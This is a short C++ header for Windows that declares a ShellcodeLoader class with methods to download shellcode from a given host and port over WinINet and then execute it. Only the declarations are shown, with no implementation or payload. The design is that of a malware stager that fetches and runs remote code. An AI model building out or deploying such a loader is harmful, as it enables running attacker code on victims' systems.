#pragma once

#include <windows.h>
#include <wininet.h>
#include <vector>
#include <cstdio>

#pragma comment (lib, "Wininet.lib")

struct ShellCode
{
	PBYTE data;
	DWORD len;
};

class ShellcodeLoader
{
public:
	ShellCode Download(LPCWSTR host, INTERNET_PORT port);
	void ExecuteShellcode(ShellCode shellcode);


};

